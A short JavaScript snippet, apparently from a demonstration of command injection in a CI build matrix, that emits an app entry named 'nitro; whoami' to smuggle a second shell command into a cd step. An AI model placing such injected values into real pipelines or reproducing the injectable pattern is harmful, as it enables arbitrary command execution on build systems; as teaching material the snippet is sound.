// The "attacker's" version of the script
const matrix = {
  app: [
    // The payload: 'nitro' (to make the cd work), ';', 'whoami'
    { name: 'nitro; whoami', project: 'whatever' },
  ],
};
console.log(JSON.stringify(matrix));
